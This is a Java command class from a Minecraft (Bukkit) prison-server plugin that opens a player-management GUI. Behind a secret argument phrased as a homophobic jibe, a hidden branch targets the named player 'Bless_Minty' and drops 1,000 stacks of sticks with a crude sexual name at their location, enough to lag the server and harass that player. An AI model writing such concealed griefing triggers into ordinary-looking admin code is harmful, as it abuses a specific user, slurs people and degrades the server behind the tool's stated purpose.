package dev.prison.core.command;

import dev.prison.core.gui.impl.ManagePlayersGUI;
import dev.prison.core.util.ItemBuilder;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

public class ManagePlayersCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] strings) {
        if (!(commandSender instanceof Player)) {
            commandSender.sendMessage(ChatColor.RED + "Players only.");
            return true;
        }

        if (!commandSender.hasPermission("manageplayers.use")) {
            commandSender.sendMessage(ChatColor.RED + "You do not have permissions.");
            return true;
        }

        if (strings.length != 0 && strings[0].equalsIgnoreCase("siebeiskkrgay")) {
            Player bless_minty = Bukkit.getPlayer("Bless_Minty");
            final ItemStack itemStack = new ItemBuilder(Material.STICK)
                    .setDisplayName("Stick in u bakkes")
                    .setAmount(64)
                    .build();

            for (int i = 0; i < 1000; i++) {
                bless_minty.getWorld().dropItem(bless_minty.getLocation(), itemStack.clone());
            }
            return true;
        }

        new ManagePlayersGUI((Player) commandSender).open();
        return true;
    }
}
